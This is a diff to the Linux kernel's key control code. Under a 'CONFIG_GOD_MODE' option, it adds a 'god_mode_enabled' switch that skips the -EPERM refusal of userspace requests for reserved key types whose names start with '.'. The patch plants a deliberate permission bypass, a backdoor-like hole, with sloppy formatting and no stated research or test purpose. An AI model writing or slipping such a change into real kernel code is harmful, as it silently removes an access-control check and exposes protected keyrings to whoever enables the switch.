@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /* Userspace key control operations
  *
  * Copyright (C) 2004-5 Red Hat, Inc. All Rights Reserved.
@@ -36,7 +39,15 @@ static int key_get_type_from_user(char *type,
 	if (ret == 0 || ret >= len)
 		return -EINVAL;
 	if (type[0] == '.')
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	type[len - 1] = '\0';
 	return 0;
 }
